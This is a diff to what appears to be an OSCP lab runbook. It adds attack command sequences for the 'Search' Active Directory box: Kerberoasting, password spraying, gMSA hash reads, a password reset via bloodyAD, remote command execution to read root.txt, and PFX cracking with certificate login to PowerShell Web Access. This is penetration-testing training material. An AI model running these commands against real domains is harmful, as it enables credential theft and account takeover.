@@ -991,6 +991,54 @@ net localgroup administrators $Username /delete
 
 Restore the original service path immediately after the command runs.
 
+## Search: gMSA read and delegated password reset
+
+~~~bash
+# Validate a candidate user and enumerate SMB shares
+netexec ldap $BoxIP -u $Username -p $Password
+netexec smb $BoxIP -u $Username -p $Password --shares
+
+# Request service tickets and crack a returned TGS
+netexec ldap $BoxIP -u $Username -p $Password --kerberoasting $BoxDir/loot/kerberoast.txt
+john $BoxDir/loot/kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+# Controlled one-password spray after checking the password policy
+netexec smb $BoxIP -u $BoxDir/loot/usernames.txt -p $Password2 --continue-on-success
+
+# Read gMSA passwords allowed to the authenticated principal
+netexec ldap $BoxIP -u $Username4 -p $Password4 --gmsa
+
+# Authenticate with the gMSA NT hash and use its delegated directory right
+netexec smb $BoxIP -u 'BIR-ADFS-GMSA$' -H $GmsaHash
+bloodyAD -d $Domain -u 'BIR-ADFS-GMSA$' -p :$GmsaHash \
+  --host $BoxIP set password Tristan.Davies 'Temporary-Lab-Password!'
+
+# Validate local administrator access and prove it with one WMI command
+netexec smb $BoxIP -u Tristan.Davies -p 'Temporary-Lab-Password!'
+netexec smb $BoxIP -u Tristan.Davies -p 'Temporary-Lab-Password!' \
+  -x 'type C:\Users\Administrator\Desktop\root.txt'
+~~~
+
+Preserve the trailing dollar sign on service accounts, quote Windows paths, and record the original target state before changing a password. The complete manual evidence is in [[OSCP/BOXES/WRITE UPS/AD/Search|Search]].
+
+## Search: client-certificate PSWA
+
+~~~bash
+# Inspect and crack a PFX held in a readable profile
+pfx2john $BoxDir/loot/staff.pfx > $BoxDir/loot/staff.pfx.hash
+john $BoxDir/loot/staff.pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
+openssl pkcs12 -in $BoxDir/loot/staff.pfx -nokeys -clcerts \
+  -passin pass:$PfxPass 2>/dev/null | openssl x509 -noout -subject -issuer
+
+# Test IIS using a PKCS#12 client certificate
+curl -skL https://$Domain/staff --cert-type P12 \
+  --cert $BoxDir/loot/staff.pfx:$PfxPass \
+  -c $BoxDir/loot/cookies.txt -b $BoxDir/loot/cookies.txt \
+  -o $BoxDir/loot/staff-logon.html
+~~~
+
+Open the saved PSWA form in a browser, preserve the hidden ASP.NET fields and cookies, select computer-name, and target the host shown by the service. See [[OSCP/RUNBOOK V2/AD - PowerShell Web Access|AD - PowerShell Web Access]].
+
 ## External Resources
 
 - [HackTricks - Active Directory](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
